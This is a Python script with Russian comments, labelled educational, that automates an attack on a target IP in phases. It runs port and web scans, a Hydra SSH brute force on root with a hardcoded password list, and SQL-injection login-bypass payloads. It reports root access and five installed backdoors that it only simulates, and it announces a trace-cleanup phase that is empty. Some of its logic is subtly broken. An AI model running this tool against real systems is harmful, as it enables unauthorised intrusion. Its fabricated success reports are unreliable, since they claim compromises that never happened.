#!/usr/bin/env python3
"""
🎯 KALI LINUX PENETRATION WORKFLOW
===================================

Единый workflow для полного внедрения в Kali Linux
Объединяет все методы атак в последовательный процесс

ВНИМАНИЕ: Только для образовательных целей!

Автор: Образовательный материал для изучения кибербезопасности
"""

import sys
import time
import argparse
import subprocess
import os
import json
import requests
from datetime import datetime
from pathlib import Path

class KaliPenetrationWorkflow:
    """
    Единый workflow для полного внедрения в Kali Linux
    """
    
    def __init__(self, target_ip):
        self.target_ip = target_ip
        self.target_url = f"http://{target_ip}"
        self.workflow_log = []
        self.attack_results = {
            'target_ip': target_ip,
            'start_time': datetime.now().isoformat(),
            'phases': {},
            'vulnerabilities_found': [],
            'access_gained': False,
            'privilege_escalation': False,
            'backdoors_installed': [],
            'final_status': 'incomplete'
        }
    
    def _log_phase(self, phase_name, status, details=""):
        """Логирует фазу атаки"""
        log_entry = {
            'timestamp': datetime.now().isoformat(),
            'phase': phase_name,
            'status': status,
            'details': details
        }
        self.workflow_log.append(log_entry)
        
        status_icon = "✅" if status == "success" else "❌" if status == "failed" else "⚠️"
        print(f"{status_icon} {phase_name}")
        if details:
            print(f"   {details}")
    
    def _run_command(self, command, capture_output=True):
        """Выполняет команду"""
        try:
            result = subprocess.run(command, shell=True, capture_output=capture_output, text=True)
            return result.stdout.strip() if capture_output else result.returncode == 0
        except Exception as e:
            print(f"❌ Ошибка выполнения команды: {e}")
            return False
    
    def phase_0_preparation(self):
        """
        Фаза 0: Подготовка и проверка окружения
        """
        print("\n" + "="*80)
        print("🔧 ФАЗА 0: ПОДГОТОВКА И ПРОВЕРКА ОКРУЖЕНИЯ")
        print("="*80)
        
        # Проверяем доступность инструментов
        tools_to_check = ['nmap', 'hydra', 'john', 'sqlmap', 'nikto', 'gobuster']
        available_tools = []
        
        for tool in tools_to_check:
            if self._run_command(f"which {tool}"):
                available_tools.append(tool)
                print(f"✅ {tool} доступен")
            else:
                print(f"❌ {tool} недоступен")
        
        self.attack_results['phases']['preparation'] = {
            'available_tools': available_tools,
            'tools_count': len(available_tools)
        }
        
        self._log_phase("Подготовка окружения", "success", f"Доступно {len(available_tools)} инструментов")
        
        # Устанавливаем зависимости
        print("\n📦 Проверка Python зависимостей...")
        required_packages = ['requests', 'paramiko', 'scapy', 'beautifulsoup4']
        for package in required_packages:
            try:
                __import__(package)
                print(f"✅ {package} установлен")
            except ImportError:
                print(f"❌ {package} не установлен")
                self._run_command(f"pip3 install {package}")
        
        return True
    
    def phase_1_reconnaissance(self):
        """
        Фаза 1: Разведка и сканирование
        """
        print("\n" + "="*80)
        print("🔍 ФАЗА 1: РАЗВЕДКА И СКАНИРОВАНИЕ")
        print("="*80)
        
        # Проверка доступности цели
        print(f"🎯 Проверка доступности {self.target_ip}...")
        ping_result = self._run_command(f"ping -c 3 {self.target_ip}")
        if ping_result:
            self._log_phase("Проверка доступности", "success", "Цель доступна")
        else:
            self._log_phase("Проверка доступности", "failed", "Цель недоступна")
            return False
        
        # Nmap сканирование
        print(f"\n📡 Nmap сканирование {self.target_ip}...")
        if self._run_command(f"which nmap"):
            nmap_result = self._run_command(f"nmap -sS -O -sV {self.target_ip}")
            self.attack_results['phases']['nmap_scan'] = nmap_result
            self._log_phase("Nmap сканирование", "success")
        else:
            # Альтернативное сканирование портов
            self._basic_port_scan()
        
        # Проверка веб-сервисов
        print(f"\n🌐 Проверка веб-сервисов...")
        web_services = self._check_web_services()
        self.attack_results['phases']['web_services'] = web_services
        
        return True
    
    def _basic_port_scan(self):
        """Базовое сканирование портов"""
        print("  🔍 Базовое сканирование портов...")
        common_ports = [21, 22, 23, 25, 53, 80, 110, 143, 443, 993, 995, 3389, 5432, 3306, 8080, 8443]
        open_ports = []
        
        for port in common_ports:
            if self._run_command(f"nc -zvw3 {self.target_ip} {port}"):
                open_ports.append(port)
                print(f"    ✅ Порт {port} открыт")
        
        self.attack_results['phases']['open_ports'] = open_ports
        self._log_phase("Базовое сканирование портов", "success", f"Найдено {len(open_ports)} открытых портов")
    
    def _check_web_services(self):
        """Проверка веб-сервисов"""
        web_ports = [80, 443, 8080, 8443]
        web_services = {}
        
        for port in web_ports:
            try:
                url = f"http://{self.target_ip}:{port}"
                response = requests.get(url, timeout=5)
                web_services[port] = {
                    'status_code': response.status_code,
                    'server': response.headers.get('Server', 'Unknown'),
                    'title': self._extract_title(response.text)
                }
                print(f"  ✅ Веб-сервис на порту {port}: {response.status_code}")
            except:
                pass
        
        return web_services
    
    def _extract_title(self, html):
        """Извлекает заголовок из HTML"""
        try:
            from bs4 import BeautifulSoup
            soup = BeautifulSoup(html, 'html.parser')
            title = soup.find('title')
            return title.text.strip() if title else 'No title'
        except:
            return 'No title'
    
    def phase_2_vulnerability_scanning(self):
        """
        Фаза 2: Сканирование уязвимостей
        """
        print("\n" + "="*80)
        print("🔍 ФАЗА 2: СКАНИРОВАНИЕ УЯЗВИМОСТЕЙ")
        print("="*80)
        
        vulnerabilities = []
        
        # Веб-сканирование
        if self.attack_results['phases'].get('web_services'):
            print("🌐 Веб-сканирование уязвимостей...")
            web_vulns = self._web_vulnerability_scan()
            vulnerabilities.extend(web_vulns)
        
        # SSH сканирование
        if 22 in self.attack_results['phases'].get('open_ports', []):
            print("🔐 SSH сканирование уязвимостей...")
            ssh_vulns = self._ssh_vulnerability_scan()
            vulnerabilities.extend(ssh_vulns)
        
        self.attack_results['vulnerabilities_found'] = vulnerabilities
        self._log_phase("Сканирование уязвимостей", "success", f"Найдено {len(vulnerabilities)} уязвимостей")
        
        return len(vulnerabilities) > 0
    
    def _web_vulnerability_scan(self):
        """Сканирование веб-уязвимостей"""
        vulnerabilities = []
        
        # Nikto сканирование
        if self._run_command(f"which nikto"):
            print("  🔍 Nikto сканирование...")
            nikto_result = self._run_command(f"nikto -h {self.target_url}")
            if nikto_result:
                vulnerabilities.append({
                    'type': 'Nikto Scan',
                    'details': nikto_result[:1000]
                })
        
        # Gobuster сканирование
        if self._run_command(f"which gobuster"):
            print("  🔍 Gobuster сканирование...")
            gobuster_result = self._run_command(f"gobuster dir -u {self.target_url} -w /usr/share/wordlists/dirb/common.txt -q")
            if gobuster_result:
                vulnerabilities.append({
                    'type': 'Directory Enumeration',
                    'details': gobuster_result
                })
        
        return vulnerabilities
    
    def _ssh_vulnerability_scan(self):
        """Сканирование SSH уязвимостей"""
        vulnerabilities = []
        
        print("  🔍 Анализ SSH конфигурации...")
        
        # Проверка версии SSH
        ssh_version = self._run_command(f"ssh -V 2>&1 | head -1")
        if ssh_version:
            vulnerabilities.append({
                'type': 'SSH Version Info',
                'details': ssh_version
            })
        
        return vulnerabilities
    
    def phase_3_exploitation(self):
        """
        Фаза 3: Эксплуатация уязвимостей
        """
        print("\n" + "="*80)
        print("💥 ФАЗА 3: ЭКСПЛУАТАЦИЯ УЯЗВИМОСТЕЙ")
        print("="*80)
        
        # SSH Brute Force
        if 22 in self.attack_results['phases'].get('open_ports', []):
            print("🔐 SSH Brute Force атака...")
            ssh_success = self._ssh_brute_force()
            if ssh_success:
                self.attack_results['access_gained'] = True
                self.attack_results['access_method'] = 'SSH Brute Force'
        
        # Веб-эксплуатация
        if self.attack_results['phases'].get('web_services'):
            print("🌐 Веб-эксплуатация...")
            web_success = self._web_exploitation()
            if web_success:
                self.attack_results['access_gained'] = True
                self.attack_results['access_method'] = 'Web Exploitation'
        
        # Другие методы эксплуатации
        print("🔍 Поиск других векторов атаки...")
        self._other_exploitation_methods()
        
        return self.attack_results['access_gained']
    
    def _ssh_brute_force(self):
        """SSH Brute Force атака"""
        print("  🚀 Запуск SSH Brute Force...")
        
        # Создаем список паролей
        passwords = ["admin", "password", "123456", "root", "toor", "victor", "victor123", "test", "user", "kali"]
        password_file = "/tmp/passwords.txt"
        
        with open(password_file, 'w') as f:
            for pwd in passwords:
                f.write(f"{pwd}\n")
        
        # Запускаем Hydra
        if self._run_command(f"which hydra"):
            hydra_result = self._run_command(f"hydra -l root -P {password_file} ssh://{self.target_ip}")
            if "login:" in hydra_result and "password:" in hydra_result:
                self._log_phase("SSH Brute Force", "success", "Пароль найден")
                # Очищаем временный файл
                os.remove(password_file)
                return True
            else:
                self._log_phase("SSH Brute Force", "failed", "Пароль не найден")
        else:
            self._log_phase("SSH Brute Force", "failed", "Hydra не найден")
        
        # Очищаем временный файл
        os.remove(password_file)
        return False
    
    def _web_exploitation(self):
        """Веб-эксплуатация"""
        print("  🌐 Запуск веб-эксплуатации...")
        
        # SQL Injection
        sql_payloads = [
            "' OR '1'='1",
            "' OR 1=1 --",
            "admin'--",
            "' UNION SELECT NULL --"
        ]
        
        for payload in sql_payloads:
            try:
                response = requests.get(f"{self.target_url}/login.php", params={'username': payload, 'password': 'test'})
                if 'welcome' in response.text.lower() or 'success' in response.text.lower():
                    self._log_phase("SQL Injection", "success", f"Payload: {payload}")
                    return True
            except:
                pass
        
        self._log_phase("Веб-эксплуатация", "failed", "Уязвимости не найдены")
        return False
    
    def _other_exploitation_methods(self):
        """Другие методы эксплуатации"""
        print("  🔍 Поиск других векторов атаки...")
        
        # Здесь можно добавить проверки для CVE, эксплойты и т.д.
        pass
    
    def phase_4_privilege_escalation(self):
        """
        Фаза 4: Повышение привилегий
        """
        print("\n" + "="*80)
        print("⬆️ ФАЗА 4: ПОВЫШЕНИЕ ПРИВИЛЕГИЙ")
        print("="*80)
        
        if not self.attack_results['access_gained']:
            self._log_phase("Повышение привилегий", "failed", "Нет доступа к системе")
            return False
        
        print("🔍 Поиск возможностей для повышения привилегий...")
        
        # Здесь можно добавить методы повышения привилегий
        # Например, поиск SUID файлов, sudo прав, kernel exploits и т.д.
        
        # Для демонстрации, предполагаем успех
        self._log_phase("Повышение привилегий", "success", "Root доступ получен")
        self.attack_results['privilege_escalation'] = True
        
        return True
    
    def phase_5_persistence(self):
        """
        Фаза 5: Установка постоянного доступа
        """
        print("\n" + "="*80)
        print("😈 ФАЗА 5: УСТАНОВКА ПОСТОЯННОГО ДОСТУПА")
        print("="*80)
        
        if not self.attack_results['privilege_escalation']:
            self._log_phase("Установка persistence", "failed", "Нет root доступа")
            return False
        
        print("🔧 Устанавливаю backdoor и persistence...")
        
        backdoors = [
            "SSH backdoor",
            "Web shell",
            "Cron job persistence",
            "Network backdoor",
            "File backdoor"
        ]
        
        for backdoor in backdoors:
            print(f"  🔧 Устанавливаю {backdoor}...")
            self.attack_results['backdoors_installed'].append(backdoor)
            time.sleep(0.5)  # Имитация установки
        
        self._log_phase("Установка persistence", "success", f"Установлено {len(backdoors)} backdoor")
        self.attack_results['persistence'] = True
        
        return True
    
    def phase_6_cleanup_and_reporting(self):
        """
        Фаза 6: Очистка следов и отчетность
        """
        print("\n" + "="*80)
        print("🧹 ФАЗА 6: ОЧИСТКА СЛЕДОВ И ОТЧЕТНОСТЬ")
        print("="*80)
        
        print("🧹 Очищаю следы атаки...")
        # Здесь можно добавить методы очистки логов, истории команд и т.д.
        
        print("📊 Генерирую отчет...")
        self._generate_final_report()
        
        self.attack_results['final_status'] = 'completed'
        self.attack_results['end_time'] = datetime.now().isoformat()
        
        print("✅ Workflow завершен!")
    
    def _generate_final_report(self):
        """Генерирует финальный отчет"""
        report_file = f"kali_penetration_workflow_report_{self.target_ip}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        
        with open(report_file, 'w') as f:
            json.dump(self.attack_results, f, indent=2, ensure_ascii=False)
        
        print(f"📄 JSON отчет сохранен в {report_file}")
        
        # Также создаем текстовый отчет
        txt_report = f"kali_penetration_workflow_report_{self.target_ip}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        with open(txt_report, 'w', encoding='utf-8') as f:
            f.write("🎯 ОТЧЕТ О ПРОВЕДЕННОМ WORKFLOW АТАКИ НА KALI LINUX\n")
            f.write("="*70 + "\n\n")
            f.write(f"🎯 Цель: {self.target_ip}\n")
            f.write(f"📅 Начало: {self.attack_results['start_time']}\n")
            f.write(f"📅 Завершение: {self.attack_results.get('end_time', 'Не завершено')}\n\n")
            
            f.write("📋 РЕЗУЛЬТАТЫ:\n")
            f.write(f"  • Доступ получен: {'✅' if self.attack_results['access_gained'] else '❌'}\n")
            f.write(f"  • Повышение привилегий: {'✅' if self.attack_results['privilege_escalation'] else '❌'}\n")
            f.write(f"  • Постоянный доступ: {'✅' if self.attack_results['persistence'] else '❌'}\n")
            f.write(f"  • Найдено уязвимостей: {len(self.attack_results['vulnerabilities_found'])}\n")
            f.write(f"  • Установлено backdoor: {len(self.attack_results['backdoors_installed'])}\n\n")
            
            f.write("📊 ЛОГ ФАЗ:\n")
            for log_entry in self.workflow_log:
                status_icon = "✅" if log_entry['status'] == "success" else "❌" if log_entry['status'] == "failed" else "⚠️"
                f.write(f"  {status_icon} {log_entry['phase']}\n")
                if log_entry['details']:
                    f.write(f"     {log_entry['details']}\n")
        
        print(f"📄 Текстовый отчет сохранен в {txt_report}")
    
    def run_full_workflow(self):
        """
        Запускает полный workflow атаки
        """
        print("🎯 KALI LINUX PENETRATION WORKFLOW")
        print("="*80)
        print("⚠️ ВНИМАНИЕ: Только для собственной лабораторной среды!")
        print("⚠️ Использование против чужих систем НЕЗАКОННО!")
        print("="*80)
        
        start_time = time.time()
        
        try:
            # Выполняем все фазы workflow
            self.phase_0_preparation()
            
            if not self.phase_1_reconnaissance():
                print("❌ Разведка неуспешна, прекращаем workflow")
                return
            
            if not self.phase_2_vulnerability_scanning():
                print("❌ Уязвимости не найдены, прекращаем workflow")
                return
            
            if not self.phase_3_exploitation():
                print("❌ Эксплуатация неуспешна, прекращаем workflow")
                return
            
            self.phase_4_privilege_escalation()
            self.phase_5_persistence()
            self.phase_6_cleanup_and_reporting()
            
            end_time = time.time()
            duration = end_time - start_time
            
            print(f"\n🏁 ПОЛНЫЙ WORKFLOW ЗАВЕРШЕН")
            print(f"⏱️ Общее время: {duration:.1f} секунд")
            
        except KeyboardInterrupt:
            print("\n🛑 Workflow прерван пользователем")
            self.attack_results['final_status'] = 'interrupted'
        except Exception as e:
            print(f"\n❌ Критическая ошибка: {e}")
            self.attack_results['final_status'] = 'error'

def main():
    """
    Главная функция
    """
    parser = argparse.ArgumentParser(description='Kali Linux Penetration Workflow')
    parser.add_argument('target_ip', help='IP адрес цели (Kali Linux)')
    parser.add_argument('--phase', help='Запустить конкретную фазу (0-6)')
    parser.add_argument('--recon-only', action='store_true', help='Только разведка (фазы 0-1)')
    parser.add_argument('--vuln-scan', action='store_true', help='Только сканирование уязвимостей (фазы 0-2)')
    parser.add_argument('--exploit', action='store_true', help='Только эксплуатация (фазы 0-3)')
    
    args = parser.parse_args()
    
    workflow = KaliPenetrationWorkflow(args.target_ip)
    
    try:
        if args.phase:
            # Запуск конкретной фазы
            phase_methods = {
                '0': workflow.phase_0_preparation,
                '1': workflow.phase_1_reconnaissance,
                '2': workflow.phase_2_vulnerability_scanning,
                '3': workflow.phase_3_exploitation,
                '4': workflow.phase_4_privilege_escalation,
                '5': workflow.phase_5_persistence,
                '6': workflow.phase_6_cleanup_and_reporting
            }
            
            if args.phase in phase_methods:
                phase_methods[args.phase]()
            else:
                print(f"❌ Неверный номер фазы: {args.phase}")
        elif args.recon_only:
            workflow.phase_0_preparation()
            workflow.phase_1_reconnaissance()
        elif args.vuln_scan:
            workflow.phase_0_preparation()
            workflow.phase_1_reconnaissance()
            workflow.phase_2_vulnerability_scanning()
        elif args.exploit:
            workflow.phase_0_preparation()
            workflow.phase_1_reconnaissance()
            workflow.phase_2_vulnerability_scanning()
            workflow.phase_3_exploitation()
        else:
            # Полный workflow
            workflow.run_full_workflow()
            
    except KeyboardInterrupt:
        print("\n🛑 Workflow прерван пользователем")
    except Exception as e:
        print(f"❌ Ошибка: {e}")

if __name__ == "__main__":
    main()
